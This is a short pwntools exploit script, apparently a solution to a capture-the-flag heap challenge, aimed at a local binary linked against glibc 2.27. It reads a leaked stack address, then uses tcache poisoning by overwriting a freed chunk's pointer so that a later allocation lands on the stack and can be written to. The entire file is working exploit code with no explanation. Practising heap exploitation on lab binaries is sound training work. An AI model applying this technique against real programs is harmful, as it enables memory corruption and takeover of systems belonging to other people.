from pwn import *

exe = ELF("./tmp_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def create(size, index):
    p.sendlineafter(b"choice:\n", b"1")
    p.sendline(f"{size}".encode())
    p.sendline(f"{index}".encode())

def view(index):
    p.sendlineafter(b"choice:\n", b"2")
    p.sendline(f"{index}".encode())

def edit(index, data):
    p.sendlineafter(b"choice:\n", b"3")
    p.sendline(f"{index}".encode())
    p.send(data)

def delete(index):
    p.sendlineafter(b"choice:\n", b"4")
    p.sendline(f"{index}".encode())

script = '''
b *create
'''

p = gdb.debug("./tmp_patched", gdbscript = script)

# MALLOC2STACK
p.recvuntil(b"here is ur gift: ")
target = int(p.recvline(), 16)
print(hex(target))

create(0x10, 0)
create(0x10, 1)
create(0x10, 2)
delete(2)
delete(1)
delete(0)
edit(0, p64(target))
create(0x10, 0)
create(0x10, 1)
edit(1, b"A" * 8)

p.interactive()